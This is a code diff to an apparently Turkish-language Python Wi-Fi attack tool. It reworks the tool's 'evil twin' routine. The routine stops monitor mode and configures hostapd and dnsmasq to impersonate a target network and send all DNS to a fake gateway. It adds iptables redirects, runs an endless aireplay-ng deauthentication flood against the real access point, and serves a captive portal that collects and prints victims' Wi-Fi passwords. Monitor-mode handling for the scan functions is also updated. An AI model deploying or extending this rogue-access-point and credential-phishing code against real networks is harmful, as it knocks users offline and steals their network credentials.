@@ -442,21 +442,45 @@ def _delete_by_pattern(directory, pattern, label):
 #  MONITOR MOD
 # ══════════════════════════════════════════════════════════════════════
 
+def _is_monitor_active():
+    """Monitor arayüz aktif mi kontrol et."""
+    r = subprocess.run(["ip", "link", "show", MON_IFACE], capture_output=True)
+    return r.returncode == 0
+
 def enable_monitor_mode():
-    section("Monitor Mod Etkinleştiriliyor")
-    if not tool_check("airmon-ng"): return
-    status(f"airmon-ng start {INTERFACE} çalıştırılıyor...")
+    if _is_monitor_active():
+        info(f"Monitor mod zaten aktif: [cyan]{MON_IFACE}[/]")
+        return True
+    if not tool_check("airmon-ng"): return False
+    status(f"Monitor mod açılıyor → [cyan]{MON_IFACE}[/]")
     subprocess.run(["sudo", "airmon-ng", "start", INTERFACE],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    success(f"Monitor mod → [bold cyan]{MON_IFACE}[/]")
-    log_event("monitor_mode", {"action": "start", "interface": MON_IFACE})
+    time.sleep(1)
+    if _is_monitor_active():
+        success(f"Monitor mod aktif → [bold cyan]{MON_IFACE}[/]")
+        log_event("monitor_mode", {"action": "start"})
+        return True
+    else:
+        error("Monitor mod açılamadı.")
+        return False
 
 def disable_monitor_mode():
-    section("Monitor Mod Kapatılıyor")
+    if not _is_monitor_active():
+        return
+    status(f"Monitor mod kapatılıyor → [cyan]{MON_IFACE}[/]")
     subprocess.run(["sudo", "airmon-ng", "stop", MON_IFACE],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     success("Monitor mod kapatıldı.")
     log_event("monitor_mode", {"action": "stop"})
+
+def with_monitor(func, *args, **kwargs):
+    """Monitor mod gerektiren fonksiyonları sarar: aç → çalıştır → kapat."""
+    if not enable_monitor_mode():
+        return
+    try:
+        func(*args, **kwargs)
+    finally:
+        disable_monitor_mode()
 
 # ══════════════════════════════════════════════════════════════════════
 #  MAC SPOOFING
@@ -886,12 +910,34 @@ def _evil_twin(ap):
 
     global _portal_essid
     essid   = ap["essid"]
-    channel = ap["channel"]
+    channel = ap["channel"].strip().split(",")[0].strip()  # "6, 11" gibi olabilir
     _portal_essid = essid
 
     captive = safe_input("Captive Portal ekle? [bold](e/h)[/]").strip().lower()
 
-    # hostapd.conf
+    # ── ADIM 1: monitor modu durdur, wlan0'ı serbest bırak ──
+    info("Monitor mod geçici olarak durduruluyor (wlan0 AP için gerekli)...")
+    subprocess.run(["sudo", "airmon-ng", "stop", MON_IFACE],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(1)
+
+    # ── ADIM 2: wlan0 IP ayarla ──
+    # Önce eski IP varsa temizle
+    subprocess.run(["sudo", "ip", "addr", "flush", "dev", INTERFACE],
+                   capture_output=True)
+    subprocess.run(["sudo", "ip", "addr", "add", "192.168.1.1/24", "dev", INTERFACE],
+                   capture_output=True)
+    subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "up"],
+                   capture_output=True)
+    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
+                   stdout=subprocess.DEVNULL)
+    success(f"IP ayarlandı: [cyan]192.168.1.1[/] → {INTERFACE}")
+
+    # ── ADIM 3: dnsmasq eski proses varsa öldür ──
+    subprocess.run(["sudo", "pkill", "-f", "dnsmasq"], capture_output=True)
+    time.sleep(0.5)
+
+    # ── ADIM 4: hostapd.conf ──
     hostapd_conf = "\n".join([
         f"interface={INTERFACE}",
         "driver=nl80211",
@@ -901,70 +947,111 @@ def _evil_twin(ap):
         "macaddr_acl=0",
         "ignore_broadcast_ssid=0",
         "auth_algs=1",
+        "wmm_enabled=0",
     ])
     conf_path = "/tmp/wifway_hostapd.conf"
     Path(conf_path).write_text(hostapd_conf)
-    success(f"hostapd.conf → [dim]{conf_path}[/]")
+    success(f"hostapd.conf yazıldı.")
 
-    # dnsmasq.conf — tüm DNS isteklerini 192.168.1.1'e yönlendir
+    # ── ADIM 5: dnsmasq.conf ──
     dnsmasq_conf = "\n".join([
         f"interface={INTERFACE}",
+        "bind-interfaces",
         "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h",
         "dhcp-option=3,192.168.1.1",
         "dhcp-option=6,192.168.1.1",
         "server=8.8.8.8",
-        "address=/#/192.168.1.1",
+        "address=/#/192.168.1.1",  # tüm DNS → captive portal
         "log-queries",
         "log-dhcp",
+        "no-resolv",
     ])
     dns_path = "/tmp/wifway_dnsmasq.conf"
     Path(dns_path).write_text(dnsmasq_conf)
-    success(f"dnsmasq.conf → [dim]{dns_path}[/]")
+    success(f"dnsmasq.conf yazıldı.")
 
-    # IP ayarla
-    subprocess.run(["sudo", "ip", "addr", "add", "192.168.1.1/24",
-                    "dev", INTERFACE], capture_output=True)
-    subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "up"], capture_output=True)
-    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
-                   stdout=subprocess.DEVNULL)
-
-    # Orijinal AP'yi deauth ile engelle
-    info("Orijinal AP deauth ile engelleniyor...")
-    deauth_proc = subprocess.Popen(
-        ["sudo", "aireplay-ng", "-0", "0", "-a", ap["bssid"], MON_IFACE],
-        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-    )
-
-    # hostapd + dnsmasq başlat
-    run_command_in_xterm(f"hostapd {conf_path}", f"Evil Twin AP: {essid}", fg="red")
-    time.sleep(2)
-    run_command_in_xterm(f"dnsmasq -C {dns_path} --no-daemon",
-                         "dnsmasq DHCP", fg="yellow")
-
+    # ── ADIM 6: iptables — captive portal yönlendirme ──
     if captive == "e":
-        info("Captive Portal → http://192.168.1.1:80")
-        portal_server = HTTPServer(("0.0.0.0", 80), CaptivePortalHandler)
-        portal_thread = threading.Thread(
-            target=portal_server.serve_forever, daemon=True)
-        portal_thread.start()
-        success("Captive Portal aktif — yakalanan şifreler ekranda görünecek.")
+        # HTTP trafiğini Python sunucusuna yönlendir
+        subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
+                        "-i", INTERFACE, "-p", "tcp", "--dport", "80",
+                        "-j", "REDIRECT", "--to-port", "80"],
+                       capture_output=True)
+        # DNS trafiğini yönlendir
+        subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
+                        "-i", INTERFACE, "-p", "udp", "--dport", "53",
+                        "-j", "REDIRECT", "--to-port", "53"],
+                       capture_output=True)
+        success("iptables yönlendirme kuralları eklendi.")
 
-    log_event("evil_twin", {"essid": essid, "captive": captive == "e"})
+    # ── ADIM 7: deauth (ayrı kart yoksa atla) ──
+    deauth_proc = None
+    if subprocess.run(["ip", "link", "show", MON_IFACE],
+                      capture_output=True).returncode == 0:
+        info("Orijinal AP deauth ile engelleniyor...")
+        deauth_proc = subprocess.Popen(
+            ["sudo", "aireplay-ng", "-0", "0", "-a", ap["bssid"], MON_IFACE],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+    else:
+        warn("Monitor arayüz yok — deauth atlanıyor. (İki kartlı kurulum gerekir)")
+
+    # ── ADIM 8: hostapd başlat ──
+    hostapd_proc = run_command_in_xterm(
+        f"hostapd {conf_path}", f"Evil Twin AP: {essid}", fg="red")
+    time.sleep(2)
+
+    # ── ADIM 9: dnsmasq başlat ──
+    run_command_in_xterm(
+        f"dnsmasq -C {dns_path} --no-daemon", "dnsmasq DHCP", fg="yellow")
+    time.sleep(1)
+
+    # ── ADIM 10: Captive Portal HTTP sunucusu ──
+    portal_server = None
+    if captive == "e":
+        try:
+            portal_server = HTTPServer(("0.0.0.0", 80), CaptivePortalHandler)
+            portal_thread = threading.Thread(
+                target=portal_server.serve_forever, daemon=True)
+            portal_thread.start()
+            success("Captive Portal aktif → [cyan]http://192.168.1.1[/]")
+            info("Bağlanan cihazlar otomatik bu sayfaya yönlendirilecek.")
+        except OSError as e:
+            error(f"Port 80 açılamadı: {e} — başka bir servis kullanıyor olabilir.")
+            warn("Şu komutu deneyin: sudo fuser -k 80/tcp")
+
+    log_event("evil_twin", {"essid": essid, "channel": channel, "captive": captive == "e"})
+    send_notification(f"Evil Twin aktif: {essid}")
 
     info("Evil Twin çalışıyor. Durdurmak için [bold]Enter[/bold]'a basın.")
     try: input()
     except KeyboardInterrupt: pass
-    deauth_proc.terminate()
 
-    if captive == "e":
+    # ── TEMİZLİK ──
+    if deauth_proc:
+        try: deauth_proc.terminate()
+        except Exception: pass
+
+    if portal_server:
         portal_server.shutdown()
-        if captured_credentials:
-            section("Yakalanan Kimlik Bilgileri")
-            for c in captured_credentials:
-                console.print(f"  SSID: [cyan]{c.get('ssid','?')}[/]  "
-                              f"Şifre: [yellow]{c.get('password','?')}[/]")
 
-    success("Evil Twin durduruldu.")
+    # iptables temizle
+    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], capture_output=True)
+    # wlan0 IP temizle
+    subprocess.run(["sudo", "ip", "addr", "flush", "dev", INTERFACE], capture_output=True)
+    # Monitor modu geri aç
+    info("Monitor mod yeniden etkinleştiriliyor...")
+    subprocess.run(["sudo", "airmon-ng", "start", INTERFACE],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+    if captured_credentials:
+        section("Yakalanan Kimlik Bilgileri")
+        for c in captured_credentials:
+            console.print(f"  SSID : [cyan]{c.get('ssid','?')}[/]")
+            console.print(f"  Şifre: [yellow]{c.get('password','?')}[/]")
+            console.print()
+
+    success("Evil Twin durduruldu, monitor mod geri açıldı.")
 
 # ══════════════════════════════════════════════════════════════════════
 #  4. WPS
@@ -1423,6 +1510,7 @@ def _automation_mode():
 def do_network_scan():
     section("Ağ Taraması")
     if not tool_check("airodump-ng"): return []
+    if not enable_monitor_mode(): return []
     status("xterm penceresini [bold]Ctrl+C[/] ile durdurun.")
     cmd  = (f"airodump-ng --write-interval 1 --output-format csv "
             f"--write {CSV_PREFIX} {MON_IFACE}")
@@ -1443,6 +1531,7 @@ def do_network_scan():
 
 def do_client_scan(ap):
     section(f"İstemci Taraması — {ap['essid']}")
+    if not enable_monitor_mode(): return []
     prefix = str(SCAN_DIR / f"{ap['bssid'].replace(':','_')}_clients")
     cmd    = (f"airodump-ng --bssid {ap['bssid']} --channel {ap['channel']} "
               f"--output-format csv --write {prefix} {MON_IFACE}")
